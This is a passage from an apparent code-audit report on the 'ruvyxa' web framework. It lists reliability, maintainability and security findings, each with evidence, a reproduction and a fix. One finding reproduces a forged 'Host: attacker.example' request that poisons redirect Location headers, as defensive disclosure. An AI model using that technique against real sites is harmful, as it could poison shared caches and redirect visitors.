  counts `read_prerender_artifact`, the wrapper, not `load_prerender_artifact` underneath it.
  Restoring the deleted pre-scan _exactly as it was originally written_ — a `jobs.iter().any(…)`
  calling the loader directly — makes a warm build read every artifact twice again and leaves
  `a_fully_warm_prerender_reads_each_artifact_once_and_starts_no_worker` **green**. Verified by
  doing it: with the pre-scan routed through the wrapper the count test fails `4 != 2`, and with it
  written the original way the count test passes. Widening the counter to the loader is not the fix
  — the loader is also called directly by
  `prerender_artifact_cache_reuses_and_invalidates_dependency_content`, so a process-global counter
  under an exact `assert_eq!` would start depending on which tests run beside it. What shipped
  instead is `the_uncounted_artifact_loader_keeps_its_two_call_sites` in `prerender.rs`, which scans
  the module's own source and pins the loader to its two allowed callers (the counted wrapper, and
  `prerender_not_found_document`, which reads once outside the counted loop). Verified red-first:
  `3 != 2` with the pre-scan restored.

### CLIB-05 — Three worker-pool exits skip `shutdown()`, which is the only thing that reaches a retired worker

- **Category:** Reliability · **Confidence:** CONFIRMED
- **Files:** `crates/ruvyxa_cli/src/client_bundle.rs:1747`, `:1768`;
  `crates/ruvyxa_cli/src/prerender.rs:772`; `crates/ruvyxa_dev_server/src/worker_pool.rs:761`,
  `:1110-1132`
- **Evidence:** In `collect_server_component_entries` the `!response.ok` branch shuts the pool down
  and the two error paths on either side of it return without doing so;
  `prerender_not_found_document` never calls it at all. `NodeWorkerPool` has no `Drop` impl, and its
  `retiring` field exists precisely because a retired worker is no longer in `workers` — its own doc
  comment describes the orphan this produces.
- **Reproduction:** A project with enough server-components routes for the single worker to cross
  `DEFAULT_ISOLATED_RENDERS_PER_WORKER` (32), plus a route whose `rsc_client_entry` fails at the
  transport level. The CLI exits on the error while the retired worker's `Child` is owned by a
  detached drain task.
- **Root cause:** Ownership of a retired worker moved from the pool to a detached tokio task, and
  `shutdown()` became the only reachable owner of that task's process. Three call sites still treat
  dropping the pool as equivalent to shutting it down.
- **Impact:** An orphaned `node` process per failed build, holding open handles on the project and
  the build directory — on Windows exactly what makes the next build's renames fail and burn through
  `rename_with_windows_retry`. `prerender_not_found_document` hits it on its _success_ path too,
  mitigated only by the build continuing long enough for the drain task to finish.
- **Fix:** Extract each loop body into a helper returning `Result` and `shutdown()` after it, as
  `prerender_static_routes` already does with its `async { … }.await` block.
- **Regression risk:** `shutdown()` waits up to `WORKER_SHUTDOWN_TIMEOUT` per worker; both pools are
  size 1, so the cost is one wait.
- **Tests:** A test that fails an `rsc_client_entry` and asserts no child process survives the
  returned error.

### CLIB-06 — The build's copy of the prerender path-safety rule is a third implementation with no shared-fixture gate, and the three already disagree

- **Category:** Reliability · **Confidence:** CONFIRMED
- **Files:** `crates/ruvyxa_cli/src/prerender.rs:1100`; `crates/ruvyxa_cli/src/tests.rs:229`;
  `packages/ruvyxa/runtime/serverless-handler.mjs:2294`;
  `tests/fixtures/prerender-path-conformance.json`
- **Evidence:** The fixture names two owners of the rule — the native server's
  `is_safe_relative_path` and the deployed handler's `isUnsafeSegment` — and a grep for the fixture
  across `crates/` never reaches `ruvyxa_cli`. The build writer has its own copy guarded by a
  hand-written six-assertion test. The three already differ: Rust's `char::is_control()` covers
  U+0080–U+009F while the JavaScript copy stops at `0x7f`, and the fixture has no C1 case.
- **Reproduction:** Static analysis. The current divergence is not exploitable — the Rust writer is
  the stricter of the three, so a U+0085 segment fails the build with `RUV1205` before any file
  exists for the looser reader to serve.
- **Root cause:** The fixture was introduced for the two _readers_. The _writer_ — the one place a
  bad segment actually becomes a filesystem path — was never enrolled, and its ungated test set is a
  strict subset of the fixture: it asserts nothing about the safe cases `hello world`, `ทดสอบ`,
  `a.b/c-d_e`, and nothing about `foo:bar`, which the fixture records as a past incident.
- **Impact:** The rule deciding what `getStaticParams()` may write into the build output can drift
  from the two rules deciding what may be read back, and only the reader half has a gate.
- **Fix:** Add a test replaying `tests/fixtures/prerender-path-conformance.json` through
  `prerender_html_path` / `is_unsafe_prerender_segment`, exactly as `static_assets.rs:1235` does,
  and add a C1-control case (`a\u{85}b`, unsafe) to the fixture.
- **Regression risk:** The C1 case will fail `isUnsafeSegment` until it is widened to
  `code < 0x20 || (code >= 0x7f && code <= 0x9f)`; that change should land with the fixture case.
- **Tests:** Named above; the fixture replay replaces
  `unsafe_prerender_segments_cover_separators_and_control_characters`.

## CLI commands, config, discovery

### CLIC-02 — `ruvyxa dev` writes `sitemap.xml` and `robots.txt` once and never updates them

- **Category:** Reliability · **Confidence:** CONFIRMED
- **Files:** `crates/ruvyxa_cli/src/runtime_config.rs:159-172`, `:185-220`;
  `crates/ruvyxa_cli/src/site_discovery.rs:379`, `:414`
- **Evidence:** `dev_server_config` points the discovery output at `.ruvyxa/cache/discovery` — a
  directory that persists — and installs an observer that regenerates on every route discovery. The
  generator refuses to write when the file already exists (`!sitemap_path.exists()`), because it was
  written for a freshly staged `assets/` directory where "project-owned files copied from `public/`
  always win". Nothing clears `cache/discovery` except `ruvyxa clean`.
- **Reproduction:** `ruvyxa dev` with `site.url` set, request `/sitemap.xml`, add
  `app/newpage/page.tsx`, wait for re-discovery, request again. The new route is absent, and stays
  absent across restarts until the cache directory is deleted.
- **Root cause:** One function serving two directories with opposite lifetimes. "Do not clobber a
  project-owned file" and "keep a generated file current" are the same predicate in a write-once
  staging directory and opposite predicates in a long-lived cache directory.
- **Impact:** Exactly defeats the stated purpose of the feature — the command a project runs while
  working on its SEO output now answers with a snapshot from whenever the cache directory was
  created. A developer verifying `exclude` rules, `additionalPaths`, or a robots policy sees the
  pre-change output and concludes their config does nothing. Worse than the 404 it replaced, because
  a wrong answer reads as an answer.
- **Fix:** Give `write_discovery_files` an explicit overwrite mode (`Regenerate::{Never, Always}`)
  rather than inferring it from `exists()` — `Never` for the build's staged `assets/`, `Always` for
  the dev observer, whose directory contains nothing but this function's own output. The
  shard-collision guard stays on the `Never` path only.
- **Regression risk:** The build path must keep refusing to overwrite: a project that ships
  `public/sitemap.xml` relies on it. The parameter has to be threaded, not defaulted.
- **Tests:** Call `write_discovery_files` twice into one directory with two manifests and assert the
  second manifest's routes are present in `Always` and absent in `Never`; plus a check in
  `scripts/smoke-dev-server.mjs` that adds a route and re-requests `/sitemap.xml`.

### CLIC-03 — `image.quality`, `image.effort` and `image.workers` bypass config validation; two are silently clamped and one is unbounded

- **Category:** Reliability · **Confidence:** CONFIRMED
- **Files:** `crates/ruvyxa_cli/src/config.rs:367-409`;
  `crates/ruvyxa_cli/src/image_optimizer.rs:271-279`, `:606-611`;
  `crates/ruvyxa_cli/src/runtime_config.rs:158`
- **Evidence:** `validate_paths` — where "a limit that is merely wrong should fail as a config error
  the user can fix" — validates paths, all four security limits, trusted proxies, i18n, and exactly
  one image field. `quality` and `effort` are silently clamped in three separate places; `workers`
  is handed straight to `rayon::ThreadPoolBuilder::new().num_threads(options.parallelism.max(1))`.
  The sibling knobs are bounded: `build.workers` is capped by `build_parallelism` (asserted by a
  test), `middleware.workers` errors with `RUV1602`.
- **Reproduction:** `image: { workers: 100000 }` attempts a 100,000-thread rayon pool — on most
  hosts a spawn failure surfacing as "failed to create the image optimization worker pool" with no
  mention of the config field; on a host that permits it, ~800 MB of committed stack and a thrashing
  build. `image: { quality: 150 }` builds successfully at quality 100 and says nothing.
- **Root cause:** The clamps are defensive depth added at the _use_ sites, and the depth was
  mistaken for validation. `check-silent-defaults.mjs` cannot see any of it — its `FALLIBLE` regex
  matches only reads and decodes, and a `.clamp()` on an already-deserialized field is neither.
- **Impact:** For `quality`/`effort`, a project that writes an out-of-range number gets a different
  build than it asked for, silently, while every other numeric config field in the file errors. For
  `workers`, a typo turns a build into a resource-exhaustion event or an error naming rayon rather
  than the config key.
- **Fix:** Extend `validate_paths` with the image block, reusing the existing helpers:
  `validate_bounded_limit("image.quality", …, 100)`, an `effort` range check `0..=6`, and a
  `workers` bound (the ceiling `middleware.workers` already uses, or `num_cpus * 4`). Leave the
  clamps as defence in depth.
- **Regression risk:** A project currently building with an out-of-range value starts failing — the
  intent, but a breaking change belonging in the changelog. `quality: 0` is currently clamped to 1
  and would newly error, consistent with `validate_bounded_limit`.
- **Tests:** Beside `rejects_zero_security_limits` and `rejects_security_limits_above_hard_ceiling`,
  the image equivalents. `tests/fixtures/dynamic-image-conformance.json` already declares
  `"quality": { "min": 1, "max": 100 }`.

### CLIC-04 — Three machine-readable outputs bypass the crate's own broken-pipe-safe writer and panic when piped into `head`

- **Category:** Reliability · **Confidence:** CONFIRMED
- **Files:** `crates/ruvyxa_cli/src/commands.rs:386-402`, `:618`, `:224-236`;
  `crates/ruvyxa_cli/src/bench.rs:286`
- **Evidence:** `write_machine_report` exists, treats `ErrorKind::BrokenPipe` as success, and has a
  test pinning that intent. `routes --json`, `analyze`, and `bench --baseline --json` use it.
  `doctor --json`, `trace`, and `bench --json` use bare `println!`, which panics on `EPIPE`.
- **Reproduction:** `ruvyxa doctor --root examples/demo --json | true`,
  `ruvyxa trace / --root examples/demo | true`, `ruvyxa bench --root examples/demo --json | true`.
- **Correction (2026-08-29, from implementing this):** the reproduction first written here used
  `| head -3` and does **not** fire — `doctor --json` emits 425 bytes, which fits the pipe buffer,
  so the writer never meets a closed reader. The defect is real but needs a reader that is already
  gone: `| true` panics with `failed printing to stdout: The pipe is being closed. (os error 232)`
  and exits 101. The gate is also not a clippy `disallowed_macros` entry — that bans a macro
  outright and this crate has ~25 legitimate `println!` calls for human output — but a test that
  scans the crate's own sources for `println!` near `serde_json::to_string`.
- **Root cause:** The helper is opt-in and nothing enforces its use; the one test tests the helper
  rather than the commands, so it cannot notice a caller that never calls it.
- **Impact:** Every one of these is a documented machine-readable mode meant to be consumed by a
  pipeline. `ruvyxa doctor --json | jq '.adapter'` — where `jq` may close the pipe after finding its
  match — turns a successful diagnostic run into a panic and a failed CI step. `main.rs:442-464`
  already went to some trouble to keep stdout clean for exactly these modes; this is the same class
  of defect at the other end of the same stream.
- **Fix:** Replace the three `println!` calls with `write_machine_report(&…)?`.
- **Regression risk:** None functionally — the same bytes with the same trailing newline.
- **Tests:** A closed-pipe test per command is heavy; the cheaper gate is a lint-style check
  flagging `println!("{}", serde_json::to_string_pretty(` in `crates/ruvyxa_cli`, in the style of
  `check-silent-defaults.mjs`, or a clippy `disallowed_macros` entry.

## Route graph, middleware, diagnostics

### GMDT-04 — `detect_render_meta` hand-rolls the `'use client'` check, so a BOM or a leading comment hides the directive

- **Category:** Reliability · **Confidence:** CONFIRMED
- **Files:** `crates/ruvyxa_graph/src/lib.rs:1838-1846`, `:900-904`;
  `crates/ruvyxa_bundler/src/references.rs:167-186`, `:224-243`
- **Evidence:** `source.trim_start().starts_with("\"use client\"")` — while 800 lines earlier the
  _same file_ asks the same question through the shared scanner and says explicitly that this is the
  rule. The shared scanner strips a BOM and leading `//` and `/* */` trivia; `str::trim_start` does
  not strip U+FEFF (it is `Cf`, not whitespace) and `starts_with` cannot see past a comment.
- **Reproduction:** `app/widget/page.tsx` beginning with
  `// eslint-disable-next-line\n'use client'\n` and no `fetch`/`process.env` markers. `ruvyxa check`
  emits `render.strategy: ssg`, not `csr`. A UTF-8 BOM — common on Windows editors, and this
  repository is Windows-hosted — does the same.
- **Root cause:** Two implementations of one directive rule inside one file. The fixed version was
  applied to `is_client_boundary` and the older hand-rolled one at the top of `detect_render_meta`
  was left in place.
- **Impact:** The page is a client component to the bundler and to `is_client_boundary`, but not to
  the strategy detector — so it can be classified SSG and pre-rendered at build time, with the
  browser-only page executed in the build's server renderer. It also silently defeats RUV1011 ("Page
  declares both `use client` and server components"), which is gated on `strategy == Csr`.
- **Fix:** Replace lines 1838-1839 with the
  `ruvyxa_bundler::reference_manifest::has_module_directive(&source, "use client")` call
  `is_client_boundary` already makes. `source` is already in hand.
- **Regression risk:** The shared scanner is strictly more accepting, so routes previously
  classified SSG/SSR become CSR — the correction, but a project relying on the bug changes
  behaviour, correctly and visibly.
- **Tests:** Near `reads_the_server_components_opt_in_from_code_only`: three cases asserting
  `RenderStrategy::Csr` for a directive preceded by a `//` comment, a `/* */` comment, and a BOM.

### GMDT-05 — Three diagnostic codes carry two or three distinct meanings, and the SARIF writer keeps only the first

- **Category:** Maintainability · **Confidence:** CONFIRMED
- **Files:** `crates/ruvyxa_graph/src/lib.rs:1337`, `:1351`, `:1358`, `:1612`, `:2379`, `:2407`,
  `:2421`, `:2433`; `crates/ruvyxa_diagnostics/src/lib.rs:152-156`
- **Evidence:** `RUV1002` means both "Invalid dynamic route segment" and "Catch-all route must be
  the final URL segment"; `RUV1006` both "Intercepting route climbs above the app root" and "…has no
  route to intercept"; `RUV1011` three distinct things. The SARIF writer keys its rule table by code
  with `rules.entry(diagnostic.code).or_insert(diagnostic)`, so the first diagnostic's title and
  explanation become the rule's description for **every** result carrying the code.
- **Reproduction:** A project tripping both RUV1006 variants in one `ruvyxa check --format sarif`
  run produces one rule whose `fullDescription` describes climbing above the app root, attached to a
  result that is about a missing interception target.
- **Root cause:** No registry and no gate. The only code-shape gate that exists is about the _join_,
  not about meaning.
- **Impact:** A user searching a code in the docs or a dashboard gets the wrong cause; a
  code-scanning upload mislabels results. Because the codes are `&'static str`, nothing at compile
  time or in CI can notice a fourth meaning being added to `RUV1011`.
- **Fix:** Split the meanings, keeping the more common one on the existing number in each pair. Then
  add a source-scanning uniqueness gate in the shape of the two that already exist in
  `ruvyxa_diagnostics`: walk `crates/*/src/*.rs`, extract every
  `Diagnostic::new("RUV####", "title")` pair including the multi-line form (`RUV1011` is spelled
  across three lines and a single-line regex misses it), and fail when one code maps to more than
  one title.
- **Regression risk:** Renumbering is breaking for any user or script matching on a code, and
  `docs/en/16-troubleshooting-upgrades.md` names twelve codes by number. Add the new codes to the
  troubleshooting doc in the same change.
- **Tests:** The uniqueness gate above, next to `no_crate_formats_a_code_beside_a_message_by_hand`.

### GMDT-06 — Layouts and templates are found only as `.tsx`, while `.jsx` is a first-class route file everywhere else

- **Category:** Reliability · **Confidence:** CONFIRMED
- **Files:** `crates/ruvyxa_graph/src/lib.rs:1380-1382`, `:1710-1712`, `:1716-1738`, `:1755-1760`;
  `crates/ruvyxa_dev_server/src/render_pipeline.rs:1391-1403`;
  `packages/ruvyxa/runtime/compiler.mjs:171-182`
- **Evidence:** `layout_chain` and `template_chain` pass one literal file name to `nested_chain`,
  and `resolve_layout_file` probes only `candidate` and `candidate.with_extension("tsx")` — while
  the same file accepts `page.jsx` as a route and accepts both `default.tsx` and `default.jsx`. The
  dev server explicitly recognises `layout.jsx` and then hands the synthesised `"app/layout"` to a
  resolver that cannot resolve it. The JS half has the same `.tsx`-only restriction, so the two are
  consistently wrong rather than divergent.
- **Reproduction:** Create `app/layout.jsx` and `app/page.jsx`, run `ruvyxa build`, inspect the
  manifest — `layoutChain` is empty and the page renders without its layout's `<html>`/`<body>`
  shell, with no diagnostic.
- **Root cause:** The route-file extension set is spelled independently at five sites in this crate
  rather than deriving from one table.
- **Impact:** A JSX-only project — plausible, since `page.jsx` is accepted — silently loses every
  layout and template. Invisible: no RUV code fires and the build succeeds. Two second-order effects
  follow: `reachable_project_modules` never walks the layout's imports, so its non-`app/`
  dependencies are not staged into `<out>/server/` (the RUV-H14 failure mode by another route), and
  `render_reachable_code` returns `None`, leaving every such route SSR.
- **Fix:** Give `nested_chain` a slice of candidate names and extend `resolve_layout_file`'s probe
  list to `["tsx", "jsx"]`. Mirror in `collectNested`/`collectLayouts`/`collectTemplates` in
  `compiler.mjs`, or the two halves disagree — which is worse than both being restricted. Better,
  hoist the extension table to one `const` and derive all five sites from it.
- **Regression risk:** A project with a stray `app/layout.jsx` beside a `layout.tsx` would see
  behaviour depend on probe order; make `.tsx` first and existing behaviour is preserved. The JS
  half must land in the same change.
- **Tests:** Beside `a_template_chain_is_discovered_alongside_the_layout_chain`, a fixture using
  `layout.jsx`/`template.jsx`/`page.jsx` asserting the chains are populated. A shared fixture
  replayed by both `nested_chain` and `collectNested` would be stronger, since the two are already a
  mirrored pair.

- **Correction (2026-08-29, from implementing this):** the extension set is spelled at **seven**
  sites in the crate, not five — `route.*` and `resolve_layout_file` were missed by the audit, and
  `resolve_layout_file` was additionally using `Path::with_extension`, which _substitutes_ rather
  than appends and so mangles any candidate containing a dot. Both halves shipped together behind
  `tests/fixtures/route-chain-conformance.json`, replayed from Rust and from `compiler.mjs`. Two
  residual items are queued: the JS mirror is named `componentExtensions` rather than
  `ROUTE_COMPONENT_EXTENSIONS` purely to avoid tripping `check-cross-language-constants.mjs`, which
  the implementer could not edit — the fixture holds the pair meanwhile; and `render_pipeline.rs`'s
  synthesised `"app/layout"` for `layout.jsx` is now resolvable but has no test of its own.

### GMDT-07 — `ruvyxa_graph/src/lib.rs` is nine subsystems in one file, and two of this audit's defects are directly attributable to that

- **Category:** Maintainability · **Confidence:** CONFIRMED
- **Files:** `crates/ruvyxa_graph/src/lib.rs` (4,776 lines; ≈2,488 implementation, ≈2,288 tests)
- **Evidence:** The file holds nine responsibilities that share no state and are never changed
  together: the route manifest data model and its serde wire contract (also read by two other crates
  and by `serverless-handler.mjs`); **HTTP cache-control policy** (`document_cache_control`,
  `ISR_EXPIRE_SECONDS`) — a response-header decision inside a filesystem route-discovery crate;
  filesystem route discovery and URL segment parsing; parallel-route slots and intercepting routes
  (≈475 lines with their own fixture and diagnostics); **a private module resolver** (RUV-H14); **a
  private `'use client'` scanner** (GMDT-04); ≈300 lines of route-export text lexing; boundary
  validation; and route conflict detection.
- **Reproduction:** Not applicable — a structural claim, evidenced by the two defects.
- **Root cause:** Accretion. Each responsibility was added where the previous one already was.
- **Impact:** Reported not as a smell but because **it plausibly causes defects, and two of them are
  in this report.** Both are the shape the repo's own trap list names, and both survived because a
  reviewer of a 4,776-line file cannot see that `is_client_boundary` at line 900 and
  `detect_render_meta` at line 1838 answer the same question two ways. It also raises maintenance
  cost concretely: two responsibilities each have their own cross-language conformance fixture, so a
  change to either forces a reader through a file where neither is findable.
- **Fix:** Split into modules within the crate — no API change, since everything already re-exports
  from `lib.rs`: `manifest.rs`, `cache_policy.rs`, `discovery.rs`, `parallel.rs`, `graph.rs` (then
  delete it in favour of the bundler's resolver per RUV-H14), `exports.rs`, `validate.rs`,
  `conflicts.rs`. Move each responsibility's tests with it.
- **Regression risk:** A pure move is low-risk but a large diff that will hide any behavioural
  change inside it. Do the split as one commit with no logic change, verified by
  `cargo test --workspace` being byte-identical in outcome, and land the RUV-H14 and GMDT-04 fixes
  separately.
- **Tests:** None new; the existing 79 tests must pass unchanged across the move, which is the
  check.

### GMDT-08 — Rate-limited and CORS-preflight responses skip request logging, timing, and configured response headers

- **Category:** Reliability · **Confidence:** CONFIRMED
- **Files:** `crates/ruvyxa_middleware/src/stack.rs:95-146`;
  `crates/ruvyxa_middleware/src/builtin.rs:313-327`, `:633-644`
- **Evidence:** `Router::layer` wraps outermost-last, so the runtime order is compression → CORS →
  rate limit → timing → logging → custom headers. Both short-circuits are produced _above_ the
  logging and custom-header layers, so neither sees them. The framework's own security headers are
  **not** lost — `lib.rs:1450` applies them as a `map_response` outside the stack — only the
  project's `middleware.builtin.headers` are.
- **Reproduction:** Configure `rate` and `headers`, exceed the limit, and observe that the 429
  carries neither the configured headers nor `x-request-id`/`x-response-time`, and that no
  `"request"` line appears in the log for it.
- **Root cause:** A short-circuiting layer produces a response the layers _below_ it never see.
  Logging and header application belong outermost precisely so they cover short-circuits.
- **Impact:** (a) Rate limiting is invisible in the request log — the one signal an operator needs
  when a limiter is misconfigured is the one that is missing, and the crate's own docs warn that a
  fixed window plus a shared bucket "turns the control meant to protect the service into the thing
  that denies it." (b) Preflights are never rate limited, so an `OPTIONS` flood from an allowed
  origin costs nothing to send. (c) Custom response headers are absent from 429 and 204 responses.
- **Fix:** Apply `RequestLoggingLayer` and `CustomHeadersLayer` _last_ so they sit outermost, just
  inside compression, and move the CORS layer inside the rate limiter so preflights are counted.
  Update the ordering comment in the same change.
- **Regression risk:** Custom headers applied outermost now override headers an inner handler set
  under the same name (`insert`, not `append`) — today the handler wins. Decide deliberately and
  state it in the doc comment. Rate-limiting preflights can break a browser client that fires many
  legitimately; a `max` set for page loads may be too low for preflight traffic.
- **Tests:** A 429 carries a configured `middleware.builtin.headers` entry and an `x-request-id`; a
  preflight consumes a rate-limit token.

  **Correction (2026-08-29, from implementing this).** Moving CORS inside the limiter — as this
  entry prescribes — counted preflights but produced the `429` _above_ the CORS layer, so a
  rate-limited cross-origin request carried no `Access-Control-Allow-Origin` and a browser reported
  an opaque CORS failure instead of the status and `Retry-After`. That trades one operator-visible
  signal for another and was **not** an acceptable resolution. What shipped keeps both: the CORS
  decision was extracted as a value (`CorsPolicy`) that the limiter's short-circuit consults, so
  there is still one allowlist check in the crate and the runtime order in the doc comment stays
  true.

  **Residual, newly found:** the deployed host answers preflights _before_ its limiter, so a
  preflight still rides free there while `dev`/`start` now charge a token — `rateLimit.max` means
  slightly different things per deployment. It belongs as a row in
  `tests/fixtures/rate-limit-conformance.json`, which already holds the two hosts level on the rest
  of this limiter.

## JS runtime compiler half

### RTMC-04 — The client-boundary env check matches upper-case names only, so `process.env.databaseUrl` passes `dev` and is refused by `build`

- **Category:** Reliability (two-graph parity) · **Confidence:** CONFIRMED (reproduced)
- **Files:** `packages/ruvyxa/runtime/compiler.mjs:4468`, `:4432`;
  `crates/ruvyxa_bundler/src/ast.rs:594`
- **Evidence:** `parsePrivateEnvName` extracts with `/^[A-Z_][A-Z0-9_]*/`; `env_read_name` in Rust
  takes the whole identifier via `skip_identifier`. Reproduced: a lowercase
  `process.env.databaseUrl` in a browser bundle is **not flagged**, the uppercase spelling is.
- **Reproduction:** Compile a browser bundle over a client module in each spelling.
- **Root cause:** The extraction rule was written as a character class instead of an identifier
  scan. Two secondary effects follow: a mixed-case name is **truncated** at the first lower-case
  letter, so `process.env.MIXED_case` is reported as `MIXED_` while Rust reports `MIXED_case`; and
  `process.env.NODE_ENVx` truncates to `NODE_ENV` and is therefore treated as the public exemption
  by one graph and a private read by the other.
- **Impact:** The dev server accepts a client module that `ruvyxa build` and `ruvyxa check` refuse —
  the failure arrives at the end of a session or in CI rather than at the keystroke. No secret leaks
  either way, so this is a gate divergence rather than an exposure. The diagnostic text also
  disagrees between hosts for a mixed-case name.
- **Fix:** Replace both `/^[A-Z_][A-Z0-9_]*/` occurrences (the `.NAME` and the `["NAME"]` branches)
  with the identifier pattern this file already owns, `identifierPattern('^%IDENT%')`, or minimally
  `/^[A-Za-z_$][\w$]*/` to match `skip_identifier`. `envReadIsPrivate` itself is correct.
- **Regression risk:** Projects that today build a browser bundle reading a lower-case name start
  failing with RUV1008 — the Rust behaviour they would have hit at `ruvyxa build` anyway.
- **Tests:** `tests/fixtures/env-policy-conformance.json` holds only the _classification_ rule and
  never the _extraction_ — two of its own cases are names the JS extractor cannot produce. Add an
  `extraction` section (source text in, names out) replayed by both sides, covering
  `process.env.databaseUrl`, `MIXED_case`, `NODE_ENVx`, `["lowerCase"]`, `$weird`.

### RTMC-06 — `isProjectLocal` has no `node_modules` exclusion, so a browser bundle's fingerprint and watched inputs cover every bundled dependency file

- **Category:** Reliability (parity) / Performance · **Confidence:** CONFIRMED (reproduced)
- **Files:** `packages/ruvyxa/runtime/compiler.mjs:2959`, `:2964`, `:709`, `:722`;
  `crates/ruvyxa_bundler/src/resolver.rs:2312`
- **Evidence:** The JS predicates answer "is this path under the project root"; the Rust one answers
  "is this project _source_" by additionally requiring `!rel.starts_with("node_modules")`.
  Reproduced: a browser bundle over `node_modules/tiny` reports `inputs` and `fingerprintInputs`
  containing `node_modules/tiny/index.js`.
- **Reproduction:** Compile a browser bundle whose entry is `export { n } from 'tiny'`.
- **Root cause:** Two predicates answering subtly different questions.
- **Impact:** (1) `dependencyHash` is meant to answer "did the application change" and instead
  re-hashes megabytes of dependency source on every browser bundle — still stable and correct, just
  far more expensive than the Rust equivalent. (2) `inputs` is what callers hand to the dev-server
  watcher, so a real application's browser bundle puts thousands of `node_modules` paths on that
  list, a file-descriptor and wake-up cost per rebuild.
- **Fix:** Give both predicates the Rust exclusion — after computing `relative`, return false when
  its first segment is `node_modules`. Keep them as two functions but share the segment test.
- **Regression risk:** `dependencyHash` changes value for every browser bundle, so every cache keyed
  on it misses once. More importantly, dropping `node_modules` from the fingerprint means a
  dependency edited in place (a `patch-package` run, a linked workspace built into `node_modules`)
  no longer invalidates — which is why `PROJECT_MANIFEST_FILES` is already in the hash and must
  stay.
- **Tests:** A case asserting a browser bundle over a `node_modules` dependency reports `inputs` and
  `fingerprintInputs` containing no `node_modules/` path, mirroring `is_project_local`'s Rust test.

## JS runtime server half

### RTMS-03 — `statSync` is used in `worker-pool.mjs` but never imported, so directory-dependency invalidation is silently dead

- **Category:** Reliability · **Confidence:** CONFIRMED (verified with a Node one-liner)
- **Files:** `packages/ruvyxa/runtime/worker-pool.mjs:1506`, `:24`, `:1460`, `:162`
- **Evidence:** The only `node:fs` import is `{ existsSync, readFileSync }`; `grep -n "statSync"`
  returns exactly one line, 1506, inside a `try` whose `catch` returns `false`. In an ESM module a
  free identifier throws `ReferenceError`, which the catch cannot distinguish from a missing path.
- **Reproduction:** Under `ruvyxa dev`, edit a file inside a directory a bundle recorded as an input
  directory (a PostCSS `dir-dependency`, e.g. a Tailwind content directory) and watch the bundle not
  invalidate.
- **Root cause:** A missing import wrapped in a `try/catch` meant to tolerate a `stat` failure.
  Every input is classified as a non-directory, `bundleInputDirectories` is permanently empty, and
  the whole directory branch of `dependencyMatches` is unreachable. The comment at `:162` describes
  a feature that has never run.
- **Impact:** In `ruvyxa dev`, a change under a recorded directory dependency does not invalidate
  the bundle, so the worker keeps serving the pre-edit render until an unrelated change clears the
  cache. Silent staleness — the worst shape a dev-server bug takes, because it reads as "my edit did
  nothing". No lint gate catches it: `.oxlintrc.json` does not enable `no-undef`.
- **Fix:** Add `statSync` to the `node:fs` import. Then narrow the `catch` so a future missing
  binding cannot hide again — catch only `ENOENT`/`ENOTDIR` and rethrow otherwise.
- **Regression risk:** The directory branch starts working, so bundles that were never invalidated
  now are — the intended behaviour. No production path is affected.
- **Tests:** Drive an `invalidate` request naming a file inside a directory reported as a bundle
  input and assert `{ invalidated: 1 }`. A cheaper companion gate: add `eslint/no-undef` to
  `.oxlintrc.json` for `packages/ruvyxa/runtime/**`, which would have caught this at lint time.

### RTMS-04 — The i18n redirect builds an absolute `Location` from the client-supplied `Host`

- **Category:** Security · **Confidence:** CONFIRMED
- **Files:** `packages/ruvyxa/runtime/serverless-handler.mjs:677`, `:1587`;
  `packages/@ruvyxa/core/src/standalone-server.ts:921`;
  `crates/ruvyxa_dev_server/src/render_pipeline.rs:252`
- **Evidence:** `Response.redirect(new URL(redirect, request.url), 307)` — `localeRedirect` returns
  a root-relative path, so the _origin_ comes entirely from `request.url`, which on the standalone
  server is built from the raw `Host` header. The native host sends the path alone.
- **Reproduction:** Deploy an i18n project with the `node` adapter and send `GET /` with
  `Host: attacker.example`. The response is `307 Location: http://attacker.example/en`. Under
  `ruvyxa start` the same request answers `Location: /en`.
- **Root cause:** `Response.redirect()` requires an absolute URL, so the code reached for
  `new URL(relative, request.url)` and inherited whatever origin the host derived from the request.
  RFC 9110 has allowed a relative `Location` since 2014 and every browser follows one; the native
  host relies on that and this host does not.
- **Impact:** A browser will not send a forged `Host` on its own, so this is not directly an open
  redirect. The realistic harm is cache poisoning — any shared cache keyed on path but not on `Host`
  (the response carries no `Vary: Host`) can store the poisoned `Location` and serve it to real
  visitors. It is also the class of bug that becomes a real open redirect the moment something
  downstream starts trusting the header. Behind platform ingress the `Host` is validated, so the
  exposure is the self-hosted adapters.
- **Fix:** Emit the relative path directly:
  `return new Response(null, { status: 307, headers: { location: redirect } })`. That matches
  `render_pipeline.rs:252` byte for byte and removes the header from the decision entirely.
- **Regression risk:** None functionally — a root-relative `Location` is resolved by the client
  against the request URL, the same result for every legitimate request.
- **Tests:** An i18n handler given `Host: evil.example`, asserting `Location` is exactly `/en` and
  contains no `://`. Extending the i18n fixture's replay to assert the emitted header shape would
  hold both hosts to one answer.

### RTMS-05 — A deployed build runs plugin hooks and routes over the reserved `/__ruvyxa/*` endpoints; the native host cannot

- **Category:** Reliability · **Confidence:** CONFIRMED
- **Files:** `packages/ruvyxa/runtime/plugin-http.mjs:48`, `:501`, `:609`, `:629`;
  `packages/ruvyxa/runtime/serverless-handler.mjs:567`; `crates/ruvyxa_dev_server/src/lib.rs:1302`,
  `:1339`
- **Evidence:** `RESERVED_FRAMEWORK_PATHS` is read only by the two socket normalisers;
  `normalizeHttpRoute` validates the path shape and the method tokens and never consults it, so
  despite the docstring a plugin _route_ at `/__ruvyxa/action` registers cleanly. Native: the
  framework endpoints are axum routes and the plugin-bearing handler is the fallback, so a reserved
  path never reaches `apply_request_plugins`. Deployed: the plugin stage wraps everything.
- **Reproduction:** Register `http.route({ path: '/__ruvyxa/action', method: 'POST', … })`. Under
  `dev`/`start` the framework answers and the plugin route is dead; in a deployed build the plugin
  answers and every server action 404s at the plugin's discretion. The converse is the same
  divergence read the other way: an `http.onRequest({ match: ['*'] })` auth hook guards
  `POST /__ruvyxa/action` when deployed and does not guard it under `dev`/`start`.
- **Root cause:** The reserved-path rule lives in a constant only the two socket normalisers
  consult, and the native enforcement is an accident of axum's route-before-fallback ordering rather
  than a check. The deployed host has no equivalent ordering and nothing put one there.
- **Impact:** A plugin's coverage of the framework endpoints differs between hosts. For a security
  plugin that is the dangerous direction — a project believing its catch-all `onRequest` guard
  covers the action endpoint is right in production and wrong locally, so the guard is never
  exercised where it is being developed. For a plugin route it is the shadowing hazard
  `RESERVED_FRAMEWORK_PATHS` exists to prevent and does not. `framework-endpoints.test.mjs` builds
  its handler with no `pluginHttp` at all, so the fixture cannot see this.
